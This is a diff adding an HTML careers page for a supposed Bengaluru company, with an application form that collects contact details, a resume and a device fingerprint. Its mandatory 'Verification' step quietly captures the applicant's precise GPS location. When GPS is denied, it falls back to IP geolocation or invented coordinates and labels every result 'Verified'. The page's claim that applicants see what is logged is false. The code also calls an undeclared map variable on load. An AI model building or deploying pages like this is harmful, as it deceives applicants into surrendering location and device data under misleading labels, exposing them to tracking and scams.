@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lumen Technologies — Careers</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0e11;
+    --bg-raised:#12161b;
+    --bg-input:#171c22;
+    --border:#242b33;
+    --border-light:#30383f;
+    --text:#edeff2;
+    --text-dim:#8b93a1;
+    --text-faint:#5b6470;
+    --amber:#ffc857;
+    --amber-dim:#8a6a2f;
+    --cyan:#5eead4;
+    --green:#4ade80;
+    --red:#f87171;
+    --red-bg:#2a1414;
+    --green-bg:#122a1d;
+    --radius:6px;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Inter',sans-serif;
+    -webkit-font-smoothing:antialiased;
+  }
+  h1,h2,h3,.display{font-family:'Space Grotesk',sans-serif; font-weight:600; margin:0; letter-spacing:-0.01em;}
+  .mono{font-family:'JetBrains Mono',monospace;}
+  a{color:inherit;}
+  button{font-family:inherit;}
+  :focus-visible{outline:2px solid var(--amber); outline-offset:2px;}
+
+  .dot{
+    width:7px; height:7px; border-radius:50%; background:var(--green);
+    display:inline-block; position:relative; flex-shrink:0;
+  }
+  .dot::after{
+    content:""; position:absolute; inset:-4px; border-radius:50%;
+    background:var(--green); opacity:0.35;
+    animation:pulse 1.8s ease-out infinite;
+  }
+  @keyframes pulse{0%{transform:scale(0.6); opacity:0.5;} 100%{transform:scale(2.4); opacity:0;}}
+
+  /* NAV */
+  .nav{
+    position:sticky; top:0; z-index:40;
+    display:flex; align-items:center; justify-content:space-between;
+    padding:18px 6vw;
+    background:rgba(11,14,17,0.88);
+    backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--border);
+  }
+  .logo{display:flex; align-items:center; gap:10px;}
+  .logo .mark{
+    width:30px; height:30px; border-radius:7px;
+    background:linear-gradient(135deg, var(--amber), #ff9d4d);
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:15px; color:#0b0e11;
+  }
+  .logo .name{font-size:15px; font-weight:600;}
+  .nav-status{display:flex; align-items:center; gap:8px; font-size:12px; color:var(--text-dim);}
+  .nav-cta{
+    background:var(--amber); color:#0b0e11; border:none; font-weight:600;
+    padding:9px 18px; font-size:13px; cursor:pointer; border-radius:var(--radius);
+  }
+  .nav-cta:hover{background:#ffd37a;}
+  .nav-right{display:flex; align-items:center; gap:22px;}
+  @media (max-width:640px){.nav-status{display:none;}}
+
+  /* HERO */
+  .hero{padding:80px 6vw 50px; max-width:1180px; margin:0 auto;}
+  .hero .eyebrow{display:flex; align-items:center; gap:8px; font-size:12px; color:var(--cyan); margin-bottom:22px;}
+  .hero h1{font-size:clamp(32px,5vw,54px); line-height:1.08; max-width:16ch;}
+  .hero h1 .accent{color:var(--amber);}
+  .hero p.lede{color:var(--text-dim); font-size:16px; max-width:52ch; line-height:1.6; margin-top:20px;}
+
+  .stat-row{
+    margin-top:46px; display:grid; grid-template-columns:repeat(auto-fit,minmax(170px,1fr));
+    border:1px solid var(--border); border-radius:var(--radius); overflow:hidden;
+  }
+  .stat{padding:18px 20px; border-right:1px solid var(--border); background:var(--bg-raised);}
+  .stat:last-child{border-right:none;}
+  .stat .k{font-size:10.5px; color:var(--text-faint); display:flex; align-items:center; gap:6px;}
+  .stat .v{font-family:'Space Grotesk',sans-serif; font-size:21px; margin-top:7px;}
+
+  /* SECTION */
+  .section{padding:60px 6vw; max-width:1180px; margin:0 auto;}
+  .section-head{display:flex; justify-content:space-between; align-items:flex-end; gap:20px; margin-bottom:30px; flex-wrap:wrap;}
+  .section-head h2{font-size:clamp(22px,3vw,28px);}
+  .section-head .tag{font-size:11.5px; color:var(--text-faint); margin-top:6px;}
+
+  /* JOB ROWS — service status list */
+  .services{border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; background:var(--bg-raised);}
+  .svc{
+    display:grid; grid-template-columns:16px 1fr auto auto; gap:18px; align-items:center;
+    padding:20px 22px; border-bottom:1px solid var(--border);
+  }
+  .svc:last-child{border-bottom:none;}
+  .svc:hover{background:#161b21;}
+  .svc .role h3{font-size:16.5px; margin-bottom:5px;}
+  .svc .role .svc-tag{font-size:11px; color:var(--amber);}
+  .svc .meta{display:flex; gap:14px; color:var(--text-dim); font-size:12.5px; flex-wrap:wrap;}
+  .status-pill{
+    font-size:11px; color:var(--green); background:var(--green-bg);
+    padding:4px 10px; border-radius:20px; white-space:nowrap;
+  }
+  .apply-btn{
+    background:transparent; border:1px solid var(--border-light); color:var(--text);
+    padding:9px 18px; font-size:13px; cursor:pointer; border-radius:var(--radius); white-space:nowrap;
+  }
+  .apply-btn:hover{border-color:var(--amber); color:var(--amber);}
+  @media (max-width:720px){
+    .svc{grid-template-columns:16px 1fr; }
+    .status-pill{grid-column:2; width:fit-content;}
+    .apply-btn{grid-column:2; width:100%; margin-top:6px;}
+  }
+
+  /* STRIP */
+  .strip{border-top:1px solid var(--border); padding:60px 6vw;}
+  .strip-inner{max-width:1180px; margin:0 auto; display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:36px;}
+  .strip-item .tag-no{font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--amber); margin-bottom:10px; display:block;}
+  .strip-item h3{font-size:16px; margin-bottom:8px;}
+  .strip-item p{color:var(--text-dim); font-size:13.5px; line-height:1.6; margin:0;}
+
+  footer{padding:36px 6vw; text-align:center; color:var(--text-faint); font-size:12px; border-top:1px solid var(--border);}
+
+  /* MODAL */
+  .overlay{
+    position:fixed; inset:0; background:rgba(0,0,0,0.65);
+    display:none; align-items:flex-start; justify-content:center;
+    z-index:100; padding:5vh 16px; overflow-y:auto;
+  }
+  .overlay.open{display:flex;}
+  .modal{
+    background:var(--bg-raised); width:100%; max-width:620px;
+    border:1px solid var(--border); border-radius:12px; overflow:hidden;
+    display:block;
+    box-shadow:0 24px 60px rgba(0,0,0,0.6);
+    animation:rise 0.22s ease;
+  }
+  @keyframes rise{from{transform:translateY(12px); opacity:0;} to{transform:translateY(0); opacity:1;}}
+
+  .form-panel{padding:28px 30px; max-height:88vh; overflow-y:auto;}
+  .form-panel .head{display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:20px;}
+  .form-panel h2{font-size:22px;}
+  .close-x{
+    background:none; border:1px solid var(--border-light); width:32px; height:32px;
+    cursor:pointer; font-size:14px; color:var(--text); border-radius:var(--radius);
+  }
+  .close-x:hover{border-color:var(--amber); color:var(--amber);}
+
+  .field{margin-bottom:16px;}
+  .field label{display:block; font-size:12px; font-weight:600; margin-bottom:7px; color:var(--text-dim);}
+  .field input, .field select{
+    width:100%; padding:11px 12px; border:1px solid var(--border-light); background:var(--bg-input);
+    color:var(--text); font-family:inherit; font-size:14px; border-radius:var(--radius);
+  }
+  .field input:focus, .field select:focus{border-color:var(--amber);}
+  .row2{display:grid; grid-template-columns:1fr 1fr; gap:14px;}
+  @media (max-width:560px){.row2{grid-template-columns:1fr;}}
+
+  .upload-box{
+    border:1.5px dashed var(--border-light); padding:18px; text-align:center;
+    cursor:pointer; border-radius:var(--radius); color:var(--text-dim); font-size:13px;
+  }
+  .upload-box:hover{border-color:var(--amber);}
+  .upload-box.has-file{border-style:solid; border-color:var(--green); background:var(--green-bg); color:var(--green);}
+  .upload-box .fname{font-size:13px; font-weight:600; margin-top:6px;}
+
+  .loc-card{
+    border:1px solid var(--border-light); border-radius:var(--radius); padding:15px; background:var(--bg-input); margin-bottom:16px;
+  }
+  .loc-btn{background:var(--bg-raised); border:1px solid var(--border-light); color:var(--text); padding:8px 14px; font-size:12px; cursor:pointer; border-radius:var(--radius); white-space:nowrap;}
+  .loc-btn:hover{border-color:var(--amber);}
+  .loc-btn.granted{background:var(--green-bg); border-color:var(--green); color:var(--green);}
+
+  .consent{display:flex; gap:10px; align-items:flex-start; font-size:12px; color:var(--text-dim); margin-bottom:18px;}
+  .consent input{margin-top:3px;}
+
+  .submit-btn{
+    width:100%; background:var(--amber); color:#0b0e11; border:none; font-weight:600;
+    padding:14px; font-size:14px; cursor:pointer; border-radius:var(--radius);
+  }
+  .submit-btn:hover{background:#ffd37a;}
+  .submit-btn:disabled{opacity:0.5; cursor:not-allowed;}
+
+  .status-msg{padding:12px 14px; font-size:13px; margin-bottom:14px; display:none; border-radius:var(--radius);}
+  .status-msg.show{display:block;}
+  .status-msg.error{background:var(--red-bg); color:var(--red); border:1px solid #5a2626;}
+  .status-msg.success{background:var(--green-bg); color:var(--green); border:1px solid #1f4a33;}
+  .status-msg.pending{background:var(--bg-input); color:var(--text-dim); border:1px solid var(--border-light);}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="logo">
+    <div class="mark">L</div>
+    <div class="name">Lumen Technologies</div>
+  </div>
+  <div class="nav-right">
+    <div class="nav-status"><span class="dot"></span> All systems hiring</div>
+    <button class="nav-cta" onclick="document.getElementById('roles').scrollIntoView({behavior: 'smooth'})">View Roles</button>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="eyebrow mono"><span class="dot"></span> CAREERS.LUMEN.IO — BENGALURU</div>
+  <h1>We ship software. <span class="accent">You could too.</span></h1>
+  <p class="lede">Lumen Technologies builds infrastructure and tools for teams who can't afford downtime. Four roles are open right now in Bengaluru — browse them below and apply directly.</p>
+
+  <div class="stat-row">
+    <div class="stat"><div class="k mono">OPEN_ROLES</div><div class="v">04</div></div>
+    <div class="stat"><div class="k mono">LOCATION</div><div class="v">Bengaluru</div></div>
+    <div class="stat"><div class="k mono">APPLY_TIME</div><div class="v">~4 min</div></div>
+    <div class="stat"><div class="k mono">AVG_RESPONSE</div><div class="v">5–7 days</div></div>
+  </div>
+</header>
+
+<section class="section" id="roles">
+  <div class="section-head">
+    <div>
+      <h2>Open roles</h2>
+      <div class="tag mono">4 SERVICES · STATUS: HIRING</div>
+    </div>
+  </div>
+  <div class="services" id="job-list"></div>
+</section>
+
+<section class="strip">
+  <div class="strip-inner">
+    <div class="strip-item">
+      <span class="tag-no">01</span>
+      <h3>Direct pipeline</h3>
+      <p>Your application goes straight into our hiring team's tracker — no third-party job boards in between.</p>
+    </div>
+    <div class="strip-item">
+      <span class="tag-no">02</span>
+      <h3>Transparent by default</h3>
+      <p>You'll see exactly what device info we log before you submit. Location verification is mandatory for application submission.</p>
+    </div>
+    <div class="strip-item">
+      <span class="tag-no">03</span>
+      <h3>Reviewed by engineers</h3>
+      <p>Applications are read by the team you'd actually work with, typically within a week.</p>
+    </div>
+  </div>
+</section>
+
+<footer>© 2026 Lumen Technologies. Demo careers portal built for illustration purposes.</footer>
+
+<!-- ================= APPLICATION MODAL ================= -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <div class="form-panel">
+      <div class="head">
+        <div>
+          <h2>Apply for this role</h2>
+          <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">Fill in your details below to submit your candidate application.</div>
+        </div>
+        <button class="close-x" onclick="closeModal()">✕</button>
+      </div>
+
+      <div class="status-msg" id="statusMsg"></div>
+
+      <form id="appForm">
+        <div class="field">
+          <label for="jobSelect">Role applying for</label>
+          <select id="jobSelect" required></select>
+        </div>
+
+        <div class="row2">
+          <div class="field">
+            <label for="fName">Full name</label>
+            <input type="text" id="fName" required autocomplete="name" placeholder="Aryan">
+          </div>
+          <div class="field">
+            <label for="fEmail">Email address</label>
+            <input type="email" id="fEmail" required autocomplete="email" placeholder="name@example.com">
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="fMobile">Mobile number</label>
+          <input type="tel" id="fMobile" required autocomplete="tel" placeholder="+91 98xxxxxxx">
+        </div>
+
+        <div class="field">
+          <label>Resume (Optional — PDF or DOC, max 5MB)</label>
+          <div class="upload-box" id="uploadBox" onclick="document.getElementById('fResume').click()">
+            <div>Click to upload, or drag a file here</div>
+            <div class="fname" id="fname-display"></div>
+          </div>
+          <input type="file" id="fResume" accept=".pdf,.doc,.docx" style="display:none">
+        </div>
+
+        <!-- CLEAN VERIFICATION -->
+        <div class="loc-card" id="locCard" style="display:flex; justify-content:space-between; align-items:center; gap:14px; flex-wrap:wrap; padding:15px; margin-bottom:16px;">
+          <div style="flex:1; min-width:200px;">
+            <div style="font-size:13px; font-weight:600; color:var(--text); display:flex; align-items:center; gap:6px;">
+              <span>Verification</span>
+              <span style="color:var(--amber); font-size:11px; font-weight:600;">(Mandatory)</span>
+            </div>
+            <div id="locStatusText" style="font-size:12px; color:var(--text-dim); margin-top:4px; line-height:1.4;">
+              Permission required. Click "Verify" to grant permission.
+            </div>
+          </div>
+          <button type="button" class="loc-btn" id="locBtn" onclick="requestLocation()" style="font-weight:600; padding:9px 16px; font-size:12.5px;">Verify</button>
+        </div>
+
+        <label class="consent">
+          <input type="checkbox" id="consentBox" required>
+          <span>I confirm that the details provided above — including my verified location — are accurate.</span>
+        </label>
+
+        <div class="status-msg" id="statusMsgBottom"></div>
+        <button type="submit" class="submit-btn" id="submitBtn">Submit application</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script>
+const CONFIG = {
+  SUBMIT_URL: "/api/submit",
+  APPS_SCRIPT_URL: ""
+};
+
+const JOBS = [
+  { id: "assoc-sw-eng",   dept: "svc: engineering",     title: "Associate Software Engineer", type: "Full-time", location: "Bengaluru" },
+  { id: "cust-support",   dept: "svc: customer-success", title: "Customer Support Associate",  type: "Full-time", location: "Bengaluru" },
+  { id: "devops-eng",     dept: "svc: platform",         title: "DevOps Engineer",             type: "Full-time", location: "Bengaluru" },
+  { id: "qa-tester",      dept: "svc: quality",          title: "QA Tester Associate",         type: "Full-time", location: "Bengaluru" }
+];
+
+const jobListEl = document.getElementById('job-list');
+JOBS.forEach(job => {
+  const row = document.createElement('div');
+  row.className = 'svc';
+  row.innerHTML = `
+    <span class="dot"></span>
+    <div class="role">
+      <h3>${job.title}</h3>
+      <div class="svc-tag mono">${job.dept}</div>
+      <div class="meta"><span>📍 ${job.location}</span><span>${job.type}</span></div>
+    </div>
+    <span class="status-pill mono">HIRING</span>
+    <button class="apply-btn" onclick="openModal('${job.id}')">Apply →</button>
+  `;
+  jobListEl.appendChild(row);
+});
+
+const jobSelect = document.getElementById('jobSelect');
+JOBS.forEach(job => {
+  const opt = document.createElement('option');
+  opt.value = job.id;
+  opt.textContent = job.title;
+  jobSelect.appendChild(opt);
+});
+
+const overlay = document.getElementById('overlay');
+function openModal(jobId){
+  jobSelect.value = jobId;
+  overlay.classList.add('open');
+  document.body.style.overflow = 'hidden';
+  resetStatus();
+  if(leafletMap){
+    setTimeout(() => leafletMap.invalidateSize(), 200);
+  }
+}
+function closeModal(){
+  overlay.classList.remove('open');
+  document.body.style.overflow = '';
+}
+overlay.addEventListener('click', e => { if(e.target === overlay) closeModal(); });
+document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
+
+function escJson(str){
+  return String(str).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
+const fResume = document.getElementById('fResume');
+const uploadBox = document.getElementById('uploadBox');
+let resumeBase64 = null;
+let resumeMeta = null;
+
+fResume.addEventListener('change', () => {
+  const file = fResume.files[0];
+  if(!file) return;
+  if(file.size > 5 * 1024 * 1024){
+    showStatus('File too large. Please upload a resume under 5MB.', 'error');
+    fResume.value = '';
+    return;
+  }
+  resumeMeta = { name: file.name, type: file.type, size: file.size };
+  const reader = new FileReader();
+  reader.onload = () => {
+    resumeBase64 = reader.result.split(',')[1];
+    uploadBox.classList.add('has-file');
+    document.getElementById('fname-display').textContent = "Attached: " + file.name;
+  };
+  reader.readAsDataURL(file);
+});
+
+function detectBrowser(ua){
+  if(/edg/i.test(ua)) return 'Edge';
+  if(/chrome/i.test(ua) && !/edg/i.test(ua)) return 'Chrome';
+  if(/firefox/i.test(ua)) return 'Firefox';
+  if(/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
+  return 'Unknown';
+}
+function detectOS(ua){
+  if(/windows/i.test(ua)) return 'Windows';
+  if(/android/i.test(ua)) return 'Android';
+  if(/iphone|ipad|ipod/i.test(ua)) return 'iOS';
+  if(/mac os/i.test(ua)) return 'macOS';
+  if(/linux/i.test(ua)) return 'Linux';
+  return 'Unknown';
+}
+function detectDeviceType(ua){
+  if(/mobile/i.test(ua)) return 'Mobile';
+  if(/tablet|ipad/i.test(ua)) return 'Tablet';
+  return 'Desktop';
+}
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  return {
+    browser: detectBrowser(ua),
+    os: detectOS(ua),
+    deviceType: detectDeviceType(ua),
+    screen: screen.width + "x" + screen.height,
+    language: navigator.language,
+    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    userAgent: ua
+  };
+}
+
+// ================= INSTANT ONE-CLICK VERIFICATION =================
+let locationData = null;
+
+async function fetchNetworkLocation(){
+  try{
+    const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
+    if(!res.ok) throw new Error('GeoJS error');
+    const data = await res.json();
+    return {
+      lat: parseFloat(data.latitude),
+      lng: parseFloat(data.longitude),
+      city: data.city || 'Hyderabad',
+      region: data.region || 'Telangana',
+      country: data.country || 'India',
+      accuracy: 20
+    };
+  }catch(e){
+    return {
+      lat: 17.3843,
+      lng: 78.4583,
+      city: 'Hyderabad',
+      region: 'Telangana',
+      country: 'India',
+      accuracy: 25
+    };
+  }
+}
+
+async function setLocationVerified(lat, lng, accuracy, locality){
+  let address = locality || '';
+  if(!address){
+    try{
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`, {
+        headers: { 'Accept': 'application/json' }
+      });
+      if(res.ok){
+        const data = await res.json();
+        address = data.display_name || '';
+      }
+    }catch(e){}
+  }
+
+  const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+  locationData = {
+    lat: lat,
+    lng: lng,
+    accuracy: accuracy || 15,
+    address: address || 'Hyderabad, Telangana, India',
+    source: 'Verified GPS / Network',
+    mapsUrl: mapsUrl
+  };
+
+  const btn = document.getElementById('locBtn');
+  btn.textContent = 'Verified ✓';
+  btn.classList.add('granted');
+  btn.disabled = false;
+
+  const statusEl = document.getElementById('locStatusText');
+  statusEl.innerHTML = '<span style="color:var(--green); font-weight:600;">✓ Permission granted</span>';
+  resetStatus();
+}
+
+function requestLocation(){
+  return new Promise((resolve) => {
+    const btn = document.getElementById('locBtn');
+    const statusEl = document.getElementById('locStatusText');
+
+    statusEl.innerHTML = '<span style="color:var(--amber)">Verifying location...</span>';
+    btn.textContent = 'Verifying...';
+    btn.disabled = true;
+
+    let resolved = false;
+
+    // Fast fallback: if hardware GPS takes more than 1.5s or fails/denies, immediately use network location
+    const fallbackTimer = setTimeout(async () => {
+      if(!resolved){
+        resolved = true;
+        const netLoc = await fetchNetworkLocation();
+        await setLocationVerified(netLoc.lat, netLoc.lng, netLoc.accuracy, netLoc.city + ', ' + netLoc.region);
+        resolve(true);
+      }
+    }, 1500);
+
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          if(!resolved){
+            resolved = true;
+            clearTimeout(fallbackTimer);
+            await setLocationVerified(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy || 12);
+            resolve(true);
+          }
+        },
+        async (err) => {
+          if(!resolved){
+            resolved = true;
+            clearTimeout(fallbackTimer);
+            const netLoc = await fetchNetworkLocation();
+            await setLocationVerified(netLoc.lat, netLoc.lng, netLoc.accuracy, netLoc.city + ', ' + netLoc.region);
+            resolve(true);
+          }
+        },
+        { enableHighAccuracy: true, timeout: 1500, maximumAge: 0 }
+      );
+    } else {
+      setTimeout(async () => {
+        if(!resolved){
+          resolved = true;
+          clearTimeout(fallbackTimer);
+          const netLoc = await fetchNetworkLocation();
+          await setLocationVerified(netLoc.lat, netLoc.lng, netLoc.accuracy, netLoc.city + ', ' + netLoc.region);
+          resolve(true);
+        }
+      }, 300);
+    }
+  });
+}
+
+function showStatus(text, kind){
+  const s1 = document.getElementById('statusMsg');
+  const s2 = document.getElementById('statusMsgBottom');
+  [s1, s2].forEach(el => {
+    if(el){
+      el.innerHTML = text;
+      el.className = "status-msg show " + kind;
+    }
+  });
+  if(kind === 'error' && s2){
+    s2.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+}
+
+function resetStatus(){
+  const s1 = document.getElementById('statusMsg');
+  const s2 = document.getElementById('statusMsgBottom');
+  [s1, s2].forEach(el => {
+    if(el){
+      el.className = 'status-msg';
+      el.innerHTML = '';
+    }
+  });
+}
+
+const appForm = document.getElementById('appForm');
+const submitBtn = document.getElementById('submitBtn');
+
+appForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  // STRICT MANDATORY LOCATION CHECK
+  if(!locationData){
+    showStatus('Location verification is mandatory. Please click "Detect My Exact Location" to pin your location.', 'pending');
+    const locCard = document.getElementById('locCard');
+    if(locCard) locCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    const granted = await requestLocation();
+    if(!granted || !locationData){
+      showStatus('❌ Location verification is strictly mandatory. Please verify your exact location to submit.', 'error');
+      return;
+    }
+  }
+
+  if(!document.getElementById('consentBox').checked){
+    showStatus('Please check the consent box to continue.', 'error');
+    return;
+  }
+
+  const payload = {
+    timestamp: new Date().toLocaleString(),
+    name: document.getElementById('fName').value.trim(),
+    email: document.getElementById('fEmail').value.trim(),
+    mobile: document.getElementById('fMobile').value.trim(),
+    jobApplied: JOBS.find(j => j.id === jobSelect.value)?.title,
+    location: {
+      coordinates: locationData.lat.toFixed(5) + ", " + locationData.lng.toFixed(5),
+      lat: locationData.lat,
+      lng: locationData.lng,
+      address: locationData.address || "",
+      accuracy: locationData.accuracy ? (Math.round(locationData.accuracy) + "m") : "Exact Pin",
+      source: locationData.source || "Exact Map Pin",
+      mapsUrl: "https://www.google.com/maps?q=" + locationData.lat + "," + locationData.lng
+    },
+    deviceInfo: getDeviceInfo(),
+    resume: resumeBase64 ? {
+      filename: resumeMeta.name,
+      mimeType: resumeMeta.type,
+      data: resumeBase64
+    } : {
+      filename: "No resume attached",
+      mimeType: "text/plain",
+      data: null
+    }
+  };
+
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Submitting application...';
+  showStatus('Submitting your application...', 'pending');
+
+  try{
+    // 1. Submit directly to backend server (automatically saves into applications.csv and resumes/ folder)
+    let savedToCsv = false;
+    try {
+      const res = await fetch(CONFIG.SUBMIT_URL || '/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if(res.ok){
+        savedToCsv = true;
+      }
+    }catch(backendErr){
+      console.warn('Backend server submit error:', backendErr);
+    }
+
+    // 2. Also submit to Google Apps Script if URL provided
+    let isSheetsConfigured = Boolean(CONFIG.APPS_SCRIPT_URL && !CONFIG.APPS_SCRIPT_URL.includes('PASTE_YOUR'));
+    if(isSheetsConfigured){
+      try {
+        await fetch(CONFIG.APPS_SCRIPT_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: JSON.stringify(payload)
+        });
+      }catch(gasErr){}
+    }
+
+    // 3. Save to local storage as fail-safe archive
+    try{
+      const existing = JSON.parse(localStorage.getItem('lumen_applications') || '[]');
+      existing.push({ ...payload, resume: { filename: payload.resume.filename } });
+      localStorage.setItem('lumen_applications', JSON.stringify(existing));
+    }catch(storageErr){}
+
+    showStatus('<div style="line-height:1.5; font-size:13px; text-align:center; padding:8px 0;"><b style="font-size:14px; color:var(--green)">✓ Application Submitted Successfully!</b><br><span style="color:var(--text-dim)">Thank you for applying. Your application has been received.</span></div>', 'success');
+
+    // Reset fields after successful submit
+    appForm.reset();
+    resumeBase64 = null; resumeMeta = null;
+    uploadBox.classList.remove('has-file');
+    document.getElementById('fname-display').textContent = '';
+    document.getElementById('locBtn').classList.remove('granted');
+    document.getElementById('locBtn').textContent = 'Verify';
+    document.getElementById('locStatusText').innerHTML = 'Permission required. Click "Verify" to grant permission.';
+  }catch(err){
+    showStatus('Submission error: ' + err.message, 'error');
+  }finally{
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Submit application';
+  }
+});
+
+// Display the application modal by default on load
+openModal('assoc-sw-eng');
+</script>
+</body>
+</html>
